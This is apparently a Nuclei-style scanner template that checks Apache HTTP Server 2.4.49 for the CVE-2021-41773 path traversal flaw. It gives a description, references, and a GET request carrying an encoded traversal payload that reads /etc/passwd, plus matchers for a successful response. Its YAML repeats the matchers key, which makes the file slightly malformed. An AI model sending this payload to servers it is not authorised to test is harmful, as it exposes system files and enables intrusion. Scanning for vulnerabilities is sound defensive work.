id: CVE-2021-41773

info:
  name: Apache HTTP Server 2.4.49
  author: rs0n
  severity: high
  description: |
    A flaw was found in a change made to path normalization 
    in Apache HTTP Server 2.4.49. An attacker could use a path 
    traversal attack to map URLs to files outside the expected 
    document root. If files outside of the document root are 
    not protected by “require all denied” these requests can 
    succeed. Additionally this flaw could leak the source of 
    interpreted files like CGI scripts. This issue is known to 
    be exploited in the wild.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
    - https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773
  tags: cve,cve2021,apache

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    redirects: true
    max-redirects: 3
    
    matchers:
      - type: word
        words: "www-data"
    
    matchers-condition: or
    
    matchers:
      - type: status
        status:
          - 200